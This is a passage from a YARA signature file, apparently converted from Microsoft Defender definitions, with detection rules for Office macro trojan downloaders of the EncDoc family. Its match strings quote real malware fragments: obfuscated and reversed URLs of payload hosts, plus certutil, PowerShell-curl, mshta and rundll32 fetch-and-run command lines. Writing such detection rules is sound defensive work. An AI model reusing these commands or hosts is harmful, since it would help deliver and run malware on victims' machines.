        $x_1_1 = "&chr(asc(mid(skey,iif(imodlen(skey)<>0,imodlen(skey),len(skey)),1))xorasc(mid(sstr,i,1)))" ascii //weight: 1
        $x_1_2 = {29 29 2b 22 66 69 6c 65 2f [0-31] 2f [0-3] 2e 68 74 6d 2f 66 69 6c 65}  //weight: 1, accuracy: Low
        $x_1_3 = "c:asd2d@xwwindowasd2asd2d@xwasd2ysta23dxm32asd2d@xw3123asd2efw2$dadw2$$adda2ediaskd2d2sxa23dxl2xw2@a23dx" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SLS_2147817671_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SLS!MTB"
        threat_id = "2147817671"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= StrReverse(\"txt.CNE/moc.snedragaemsoc.www//:sptth\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PABB_2147817812_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PABB!MTB"
        threat_id = "2147817812"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "subfocuswork()dimkoooollllllllf" ascii //weight: 1
        $x_1_2 = "meta=worksheets(\"blanked1\").range(\"a1030\")+worksheets(\"blanked1\").range(\"b103\")p" ascii //weight: 1
        $x_1_3 = "gone=\"wscriptc:\\users\\public\\pictures\\focus.js\"callvba.shell(one,vbnormalfocus)ends" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PABD_2147818566_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PABD!MTB"
        threat_id = "2147818566"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {3d 73 68 65 6c 6c 28 22 63 6d 64 2f 63 63 65 72 74 75 74 69 6c 2e 65 78 65 2d 75 72 6c 63 61 63 68 65 2d 73 70 6c 69 74 2d 66 22 22 68 74 74 70 73 3a 2f 2f 6b 6e 67 31 64 34 2e 78 79 7a 2f 77 72 66 70 6e 71 62 74 2f 67 7a 6a 75 6e 73 6c 66 70 6f 30 38 37 38 35 35 2e 65 78 65 22 22 [0-47] 2e 65 78 65 2e 65 78 65 26 26 00 2e 65 78 65 2e 65 78 65 22 2c 76 62 68}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KAJ_2147818637_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KAJ!MTB"
        threat_id = "2147818637"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sbv.tneilC02%detcetorP/2/zib.remaed//:" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_EGPK_2147818778_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.EGPK!MTB"
        threat_id = "2147818778"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "t\"&\"tp:/\"&\"/h\"&\"ul\"&\"ls\"&\"it\"&\"e.c\"&\"o\"&\"m/0\"&\"a6\"&\"1/n\"&\"m6\"&\"lx\"&\"oc\"&\"qt/" ascii //weight: 1
        $x_1_2 = "t\"&\"tp\"&\"s://p\"&\"pi\"&\"ab\"&\"an\"&\"yu\"&\"wa\"&\"ng\"&\"i.o\"&\"r.i\"&\"d/w\"&\"p-a\"&\"dm\"&\"in/3S\"&\"e7\"&\"gi\"&\"NX\"&\"t7\"&\"ZC\"&\"HG/" ascii //weight: 1
        $x_1_3 = "t\"&\"t\"&\"p://a\"&\"na\"&\"t-b\"&\"a\"&\"r.c\"&\"o.i\"&\"l/w\"&\"p-a\"&\"dm\"&\"in/k\"&\"Za\"&\"rr\"&\"jJ\"&\"N1\"&\"48\"&\"on\"&\"Rn\"&\"Ri/" ascii //weight: 1
        $x_1_4 = "t\"&\"tp\"&\"s:/\"&\"/be\"&\"nc\"&\"ev\"&\"en\"&\"de\"&\"gh\"&\"az.h\"&\"u/w\"&\"p-in\"&\"cl\"&\"ud\"&\"es/c\"&\"Lr\"&\"qB\"&\"Iw\"&\"f8\"&\"C/" ascii //weight: 1
        $x_1_5 = "t\"&\"t\"&\"p://3\"&\"ds\"&\"tu\"&\"di\"&\"oa.c\"&\"o\"&\"m.b\"&\"r/c\"&\"g\"&\"i-b\"&\"in/y\"&\"Wp\"&\"on\"&\"1N\"&\"d0\"&\"3l/" ascii //weight: 1
        $x_1_6 = "tt\"&\"p://c\"&\"lau\"&\"dio\"&\"ave\"&\"lar.a\"&\"d\"&\"v.b\"&\"r/R\"&\"ev\"&\"is\"&\"ta/Jlj\"&\"ahS\"&\"R2\"&\"6i\"&\"5k/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PABE_2147818885_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PABE!MTB"
        threat_id = "2147818885"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(1,2))+1,2)ifp=23thenu=f:f=\"\"ifp=36thenr=f:f=\"\"nextl(1)=u&\"\":l(2)=trim(r):l(3)=fhligfa=l" ascii //weight: 1
        $x_1_2 = "abs(application.windowstate)&\".\"endfunctionfunctiongg(masstring)callshell((\"regsvr32/s\"&m))" ascii //weight: 1
        $x_1_3 = "minimal_max()maxz=herooo(0,hligfa(mami),hfluids,0,0)minc=gg(\"calc\"):minc=gg(hfluids):" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_EJPK_2147818974_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.EJPK!MTB"
        threat_id = "2147818974"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ":/\"&\"/p\"&\"r\"&\"a\"&\"a\"&\"c\"&\"hi\"&\"c\"&\"h\"&\"e\"&\"m\"&\"fo\"&\"od.c\"&\"o\"&\"m/w\"&\"p-c\"&\"o\"&\"nt\"&\"en\"&\"t/M\"&\"wm\"&\"os/" ascii //weight: 1
        $x_1_2 = "://b\"&\"o\"&\"s\"&\"n\"&\"y.c\"&\"o\"&\"m/a\"&\"sp\"&\"ne\"&\"t_c\"&\"l\"&\"i\"&\"e\"&\"n\"&\"t/r\"&\"n\"&\"M\"&\"p\"&\"0\"&\"o\"&\"f\"&\"R/" ascii //weight: 1
        $x_1_3 = "://b\"&\"or\"&\"ge\"&\"li\"&\"n.o\"&\"r\"&\"g/b\"&\"el\"&\"ze\"&\"bu\"&\"b/o\"&\"kw\"&\"RW\"&\"z1\"&\"C/" ascii //weight: 1
        $x_1_4 = ":\"&\"//lo\"&\"pe\"&\"sp\"&\"ub\"&\"li\"&\"ci\"&\"da\"&\"de.c\"&\"o\"&\"m/cgi-bin/e\"&\"5R\"&\"5o\"&\"G4\"&\"iEa\"&\"Qn\"&\"xQ\"&\"rZ\"&\"Dh/" ascii //weight: 1
        $x_1_5 = "://l\"&\"o\"&\"a-h\"&\"k.c\"&\"o\"&\"m/w\"&\"p-co\"&\"n\"&\"te\"&\"nt/ff\"&\"Ba\"&\"g/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ELPK_2147819005_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ELPK!MTB"
        threat_id = "2147819005"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://a\"&\"i\"&\"rl\"&\"i\"&\"ft\"&\"l\"&\"i\"&\"m\"&\"o.c\"&\"o\"&\"m/w\"&\"p-a\"&\"d\"&\"mi\"&\"n/1\"&\"2\"&\"D\"&\"t\"&\"B\"&\"7\"&\"k\"&\"P\"&\"6\"&\"U\"&\"r\"&\"8\"&\"X\"&\"7\"&\"7/" ascii //weight: 1
        $x_1_2 = "://m\"&\"e\"&\"u\"&\"s\"&\"r\"&\"e\"&\"c\"&\"u\"&\"r\"&\"s\"&\"o\"&\"s.c\"&\"o\"&\"m.b\"&\"r/w\"&\"p-i\"&\"ncl\"&\"u\"&\"d\"&\"e\"&\"s/r\"&\"d\"&\"x\"&\"ro/" ascii //weight: 1
        $x_1_3 = "://m\"&\"e\"&\"u\"&\"s\"&\"r\"&\"e\"&\"c\"&\"u\"&\"r\"&\"s\"&\"o\"&\"s.c\"&\"o\"&\"m.b\"&\"r/w\"&\"p-i\"&\"nc\"&\"l\"&\"u\"&\"d\"&\"e\"&\"s/Z\"&\"2\"&\"k\"&\"f\"&\"A\"&\"Y\"&\"c\"&\"Y\"&\"W\"&\"p/" ascii //weight: 1
        $x_1_4 = ":/\"&\"/r\"&\"o\"&\"b\"&\"o\"&\"t\"&\"i\"&\"x\"&\"p\"&\"e\"&\"n\"&\"e\"&\"d\"&\"e\"&\"s.c\"&\"o\"&\"m/w\"&\"p-a\"&\"d\"&\"m\"&\"in/2\"&\"T\"&\"H\"&\"6\"&\"N\"&\"O\"&\"3/" ascii //weight: 1
        $x_1_5 = "://li\"&\"t\"&\"e\"&\"s\"&\"c\"&\"a\"&\"p\"&\"e.c\"&\"o\"&\"m.m\"&\"y/w\"&\"p-c\"&\"on\"&\"t\"&\"e\"&\"n\"&\"t/w\"&\"h/" ascii //weight: 1
        $x_1_6 = "://o\"&\"l\"&\"d.l\"&\"i\"&\"c\"&\"e\"&\"u\"&\"m\"&\"9.r\"&\"u/i\"&\"m\"&\"a\"&\"g\"&\"e\"&\"s/\"&\"R/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKSX_2147819305_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKSX!MTB"
        threat_id = "2147819305"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ttp://www.clasite.com/blogs/IEEsyn/\",\"" ascii //weight: 1
        $x_1_2 = "ttps://oncrete-egy.com/wp-content/V6Igzw8/\",\"" ascii //weight: 1
        $x_1_3 = "ttp://opencart-destek.com/catalog/OqHwQ8xlWa5Goyo/\",\"" ascii //weight: 1
        $x_1_4 = "ttp://www.pjesacac.com/components/O93XXhMN3tOtTlV/\",\"" ascii //weight: 1
        $x_1_5 = "ttps://bosny.com/aspnet_client/NGTx1FUzq/\",\"" ascii //weight: 1
        $x_1_6 = "ttps://www.berekethaber.com/hatax/c7crGdejW4380ORuxqR/\",\"" ascii //weight: 1
        $x_1_7 = "ttps://bulldogironworksllc.com/temp/BBh5HHpei/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDQW_2147819520_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDQW!MTB"
        threat_id = "2147819520"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Cetdrd.OOOOCCCCXXXX" ascii //weight: 1
        $x_1_2 = "44699,6282730324.dat" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KAAP_2147819958_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KAAP!MTB"
        threat_id = "2147819958"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Replace(\"cmd.participantforgetxparticipantforget /c pow^participantforgetrs^hparticipantforgetll/W 01 c^u^rl" ascii //weight: 1
        $x_1_2 = "://ddl8.data.hu/gparticipantforgett/328010/13313845/Eazoqo.participantforget^xparticipantforget -o \" & waitdo & \";\" & waitdo, \"participantforget\", \"e\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SQS_2147820025_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SQS!MTB"
        threat_id = "2147820025"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Replace(\"cmd." ascii //weight: 1
        $x_1_2 = {3a 2f 2f 64 64 6c 38 2e 64 61 74 61 2e 68 75 2f [0-255] 2f [0-10] 2f [0-10] 2f}  //weight: 1, accuracy: Low
        $x_1_3 = ".Save" ascii //weight: 1
        $x_1_4 = "= Replace(\"rundKfau8s8ad6yaKfau8s8ad6ya32 urKfau8s8ad6ya.dKfau8s8ad6yaKfau8s8ad6ya,OpenURL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SQS_2147820025_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SQS!MTB"
        threat_id = "2147820025"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"C:\\Users\\Public\\open.js\"" ascii //weight: 1
        $x_1_2 = "= new ActiveXObject('Wscript.Shell');KALYJA = \"\"mshta" ascii //weight: 1
        $x_1_3 = "://bitbucket.org/!api/2.0/snippets/rikimartinplace/9EEA9b/1a6205ffead27164296834f3bd103efdd0fe47f4/files/manavisionfinal" ascii //weight: 1
        $x_1_4 = "://bitbucket.org/!api/2.0/snippets/rikimartinplace/KMMe6p/84dd89e3da0a597f178af84b75fa301869bb9740/files/charlesfinal" ascii //weight: 1
        $x_1_5 = "= \"explorer.exe \"" ascii //weight: 1
        $x_1_6 = "Debug.Print" ascii //weight: 1
        $x_1_7 = "Call VBA.Shell%(textfile1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PABG_2147820225_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PABG!MTB"
        threat_id = "2147820225"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "int(89765*rnd)+198msee=\"scripting.\":msee=msee&\"fil" ascii //weight: 1
        $x_1_2 = ")zrty=tedergm:callshell(((naame(speee-msoctpdockpositionrestrictnochange)&ffalse)))endf" ascii //weight: 1
        $x_1_3 = "hro=6dimoutlings(speee)figg=0foreachscrrollinrange(\"h76:i92\").rowsfigg=figg+3-speeewees=wees&mid" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KAAT_2147820314_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KAAT!MTB"
        threat_id = "2147820314"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"C:\\Users\\Public\\open.js\"" ascii //weight: 1
        $x_1_2 = "= new ActiveXObject('Wscript.Shell');KALYJA = \"\"mshta " ascii //weight: 1
        $x_1_3 = "://bitbucket.org/!api/2.0/snippets/rikimartinplace/6EEeM4/83bff5709919e38ef1c3bbcce9758c1ab61406b3/files/divinefinal" ascii //weight: 1
        $x_1_4 = "= \"explorer.exe \" + opentext" ascii //weight: 1
        $x_1_5 = "Debug.Print" ascii //weight: 1
        $x_1_6 = "Call VBA.Shell%(textfile1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AML_2147820392_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AML!MTB"
        threat_id = "2147820392"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2f 22 2c 22 [0-15] 70 3a 2f 2f [0-223] 2e [0-223] 2f 22 2c 22 [0-223] 70 3a 2f 2f [0-223] 2e [0-223] 2f 22 2c 22 [0-223] 70 3a 2f 2f [0-223] 2e [0-223] 2f 22 2c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_KAAW_2147821547_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.KAAW!MTB"
        threat_id = "2147821547"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"SHELL32.DLL,ShellExec_RunDLL \"\"mshta\"\" \"\"http://www.asianexportglass.shop/p/11.html\"\"\"" ascii //weight: 1
        $x_1_2 = "Call Shell!(\"rundll32 \" + kulabear)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PABI_2147821942_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PABI!MTB"
        threat_id = "2147821942"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {65 28 29 70 6f 6c 65 72 62 65 61 72 3d 22 61 73 64 32 65 66 77 32 61 32 33 64 78 6c 6c 33 32 32 64 32 73 78 64 7e 7e 21 21 40 7e 7e 61 73 6b 64 7e 7e 21 21 40 7e 7e 61 73 6b 64 2c 61 73 64 32 65 66 77 32 65 6c 6c 61 32 33 64 78 78 65 63 5f 7e 7e 21 21 40 7e 7e 61 73 21 40 24 24 6b 64 75 6e 64 7e 7e 21 21 40 7e 7e 61 73 6b 64 7e 7e 21 21 40 7e 7e 61 73 6b 64 22 22 33 31 32 33 61 73 64 32 65 66 77 32 21 64 61 64 77 32 21 21 61 64 64 61 32 65 64 69 61 73 6b 64 22 22 22 22 68 74 74 70 73 3a 2f 2f 62 69 74 62 75 63 6b 65 74 2e 6f 72 67 2f 21 61 70 69 2f 32 2e 30 2f 73 6e 69 70 70 65 74 73 2f 31 32 73 64 73 2f [0-8] 2f ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 2f 66 69 6c 65 73 2f 73 6e 69 70 70 65 74 2e 74 78 74}  //weight: 1, accuracy: Low
        $x_1_2 = "r,\"~~!!@~~as!@$$kd\",\"r\")polerbear=vba.replace(polerbear,\"a23dx\",\"e" ascii //weight: 1
        $x_1_3 = ":callvba.shell@(\"rundll32\"+\"\"+polerbear)e" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKSY_2147822788_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKSY!MTB"
        threat_id = "2147822788"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.centurypapers.com/classes/pWG9OiW050VLSs/\",\"" ascii //weight: 1
        $x_1_2 = "://brooklynservicesgroup.com/inc/pIyuM/\",\"" ascii //weight: 1
        $x_1_3 = "://chainandpyle.com/Old/UlfGGNN6xbau/\",\"" ascii //weight: 1
        $x_1_4 = "://charmslovespells.com/yt-assets/ZcCNJI1B/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKSY_2147822788_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKSY!MTB"
        threat_id = "2147822788"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 45 54 55 [0-32] 3a 2f 2f [0-5] 22 26 22 [0-5] 22 26 22 [0-5] 22 26 22 [0-5] 22 26 22 [0-32] 2e [0-5] 22 26 22 [0-32] 2f [0-5] 22 26 22 [0-5] 22 26 22 [0-32] 2f [0-5] 22 26 22 [0-5] 22 26 22 [0-80] 2f 22 2c 22 [0-5] 3a 2f 2f [0-5] 22 26 22 [0-5] 22 26 22 [0-5] 22 26 22 [0-5] 22 26 22 [0-5] 22 26 22 [0-32] 2e [0-5] 22 26 22 [0-32] 2f [0-5] 22 26 22 [0-5] 22 26 22 [0-32] 2f [0-5] 22 26 22 [0-5] 22 26 22 [0-80] 2f 22 2c 22 [0-5] 3a 2f 2f [0-5] 22 26 22 [0-5] 22 26 22 [0-5] 22 26 22 [0-5] 22 26 22 [0-32] 2e [0-5] 22 26 22 [0-32] 2f [0-5] 22 26 22 [0-5] 22 26 22 [0-32] 2f [0-5] 22 26 22 [0-5] 22 26 22 [0-80] 2f 22 2c 22 [0-5] 3a 2f 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKJA_2147822794_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKJA!MTB"
        threat_id = "2147822794"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 45 54 55 [0-5] 28 29 [0-5] 52 4e [0-15] 22 2c 22 [0-10] 22 26 22 2f 75 22 26 22 70 6c 22 26 22 6f 61 22 26 22 64 2f 78 22 26 22 73 56 22 26 22 45 50 22 26 22 72 34 22 26 22 37 30 22 26 22 38 55 22 26 22 6b 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKJA_2147822794_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKJA!MTB"
        threat_id = "2147822794"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 45 54 55 [0-32] 3a 2f [0-64] 2e [0-5] 2f [0-32] 2f [0-32] 2f 22 2c 22 [0-32] 3a 2f 2f [0-64] 2e [0-5] 2f [0-32] 2f [0-32] 2f 22 2c 22 [0-32] 3a 2f 2f [0-64] 2e [0-3] 2f [0-32] 2f [0-32] 2f 22 2c 22 [0-32] 3a 2f 2f [0-64] 2e [0-3] 2f [0-32] 2f [0-32] 2f 22 2c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PKSZ_2147823730_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PKSZ!MTB"
        threat_id = "2147823730"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "collabsolutions.co.za/libraries/qn8LLQ66K/" ascii //weight: 1
        $x_1_2 = "comecebem.com/wp-admin/WvCd0OfZD/" ascii //weight: 1
        $x_1_3 = "congtycamvinh.com/plugins/rwPRWazNkGzg/" ascii //weight: 1
        $x_1_4 = "dotcompany.com.br/autoupdate/WVzrARSu74NtSh61uF/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AMLF_2147823768_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AMLF!MTB"
